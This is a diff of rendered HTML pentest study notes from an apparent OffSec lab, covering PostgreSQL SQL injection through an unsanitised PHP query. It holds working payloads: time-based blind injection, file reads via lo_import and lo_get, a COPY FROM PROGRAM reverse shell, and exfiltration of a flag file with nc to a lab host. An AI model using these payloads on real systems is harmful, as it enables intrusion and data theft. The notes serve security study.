@@ -27020,7 +27020,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-3-6">6</a></span>
 <span class="normal"><a href="#__codelineno-3-7">7</a></span>
 <span class="normal"><a href="#__codelineno-3-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>postgresql<span class="w"> </span>postgresql-client-common<span class="w"> </span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="c1"># this will install postgresql in case you don&#39;t have it.</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="c1"># this will install postgresql in case you don't have it.</span>
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>
 </span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>psql<span class="w"> </span>-U<span class="w"> </span>christine<span class="w"> </span>-h<span class="w"> </span>localhost<span class="w"> </span>-p<span class="w"> </span><span class="m">1234</span>
 </span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="c1"># Using our installation of psql, we can now interact with the PostgreSQL service running locally on the target machine:</span>
@@ -27094,25 +27094,25 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div></td></tr></table></div>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
 <span class="normal"><a href="#__codelineno-7-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a># Basic time delay confirmation:
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>height=1&#39;; SELECT pg_sleep(5)--
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>height=1'; SELECT pg_sleep(5)--
 </span></code></pre></div></td></tr></table></div>
 <p>From SQL capstone in Offsec.</p>
 <h3 id="reading-files-via-lo_import-lo_get">Reading Files via <code>lo_import()</code> + <code>lo_get()</code></h3>
 <p>PostgreSQL allows importing files as large objects (OIDs) and then reading them with <code>lo_get()</code>.</p>
 <h4 id="example">Example:</h4>
 <p>Vulnerable code:</p>
-<div class="language-postgresql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="err">$</span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pg_query</span><span class="p">(</span><span class="err">$</span><span class="n">con</span><span class="p">,</span><span class="w"> </span><span class="s s-Name">&quot;select * from users where email like &#39;%&quot;</span><span class="w"> </span><span class="mf">.</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s s-Name">&quot;height&quot;</span><span class="p">]</span><span class="w"> </span><span class="mf">.</span><span class="w"> </span><span class="s s-Name">&quot;%&#39;&quot;</span><span class="p">);</span>
+<div class="language-postgresql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="err">$</span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pg_query</span><span class="p">(</span><span class="err">$</span><span class="n">con</span><span class="p">,</span><span class="w"> </span><span class="s s-Name">"select * from users where email like '%"</span><span class="w"> </span><span class="mf">.</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s s-Name">"height"</span><span class="p">]</span><span class="w"> </span><span class="mf">.</span><span class="w"> </span><span class="s s-Name">"%'"</span><span class="p">);</span>
 </span></code></pre></div></td></tr></table></div>
 <p>This pg_query call is not sanitized and allows us to perform multi-statement injections:</p>
 <div class="language-postgresql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
 <span class="normal"><a href="#__codelineno-9-2">2</a></span>
 <span class="normal"><a href="#__codelineno-9-3">3</a></span>
 <span class="normal"><a href="#__codelineno-9-4">4</a></span>
-<span class="normal"><a href="#__codelineno-9-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="n">height</span><span class="o">=</span><span class="mf">1</span><span class="s1">&#39;;</span>
+<span class="normal"><a href="#__codelineno-9-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="n">height</span><span class="o">=</span><span class="mf">1</span><span class="s1">';</span>
 </span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="s1">CREATE TEMP TABLE x(o oid);</span>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="s1">INSERT INTO x VALUES(lo_import(&#39;</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">flag</span><span class="mf">.</span><span class="n">txt</span><span class="s1">&#39;));</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="s1">INSERT INTO x VALUES(lo_import('</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">flag</span><span class="mf">.</span><span class="n">txt</span><span class="s1">'));</span>
 </span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="s1">SELECT pg_sleep(5) FROM pg_catalog.pg_largeobject</span>
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="s1">WHERE substring(convert_from(lo_get((SELECT o FROM x)), &#39;</span><span class="n">UTF8</span><span class="s1">&#39;), 1, 1) = &#39;</span><span class="n">O</span><span class="s1">&#39;--</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="s1">WHERE substring(convert_from(lo_get((SELECT o FROM x)), '</span><span class="n">UTF8</span><span class="s1">'), 1, 1) = '</span><span class="n">O</span><span class="s1">'--</span>
 </span></code></pre></div></td></tr></table></div>
 <p>This triggers a 5-second delay if the first character of <code>/var/www/flag.txt</code> is <code>O</code>.</p>
 <h3 id="remote-shell-via-copy-from-program">Remote Shell via <code>COPY FROM PROGRAM</code></h3>
@@ -27149,8 +27149,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12"></a>Priority: u=0, i
 </span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13"></a>Connection: keep-alive
 </span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14"></a>
-</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15"></a>weight=6&amp;height=1&#39;;CREATE TEMP TABLE x();
-</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16"></a>COPY x FROM PROGRAM &#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.45.201/4321 0&gt;&amp;1&quot;&#39;--age=6&amp;gender=Male&amp;email=lala%40lala.com
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15"></a>weight=6&amp;height=1';CREATE TEMP TABLE x();
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16"></a>COPY x FROM PROGRAM 'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.45.201/4321 0&gt;&amp;1"'--age=6&amp;gender=Male&amp;email=lala%40lala.com
 </span></code></pre></div></td></tr></table></div>
 <ul>
 <li>Creates a dummy temp table <code>x</code> (even without columns)</li>
@@ -27161,10 +27161,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
 <span class="normal"><a href="#__codelineno-11-2">2</a></span>
 <span class="normal"><a href="#__codelineno-11-3">3</a></span>
-<span class="normal"><a href="#__codelineno-11-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>height=1&#39;;
+<span class="normal"><a href="#__codelineno-11-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>height=1';
 </span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>DROP TABLE IF EXISTS x;
 </span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3"></a>CREATE TEMP TABLE x();
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4"></a>COPY x FROM PROGRAM &#39;cat /var/www/flag.txt | nc 192.168.45.201 1234&#39;--
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4"></a>COPY x FROM PROGRAM 'cat /var/www/flag.txt | nc 192.168.45.201 1234'--
 </span></code></pre></div></td></tr></table></div>
 <p>On attacker's side:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>nc -lvnp 1234
